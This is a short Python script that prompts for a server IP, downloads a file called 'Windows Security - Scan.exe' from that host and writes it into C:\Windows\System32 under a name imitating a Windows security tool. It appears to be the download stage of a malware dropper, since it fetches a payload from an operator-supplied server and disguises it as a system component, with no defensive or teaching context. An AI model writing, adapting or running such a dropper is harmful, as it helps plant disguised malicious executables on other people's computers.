import requests
from time import sleep
from os import system

# Configuration
SERVER_IP = input("Enter IP : ") 
PORT = 8000  
FILE_NAME = 'Windows Security - Scan.exe'  
OUTPUT_FILE = 'C:\Windows\System32\WindowsSecurityScan.exe' 
# Construct the URL
url = f'http://{SERVER_IP}:{PORT}/{FILE_NAME}'

# Download the file
response = requests.get(url)

# Check if the request was successful
if response.status_code == 200:
    with open(OUTPUT_FILE, 'wb') as file:
        file.write(response.content)
    print(f'File downloaded successfully and saved as {OUTPUT_FILE}')
else:
    print(f'Failed to download file. HTTP status code: {response.status_code}')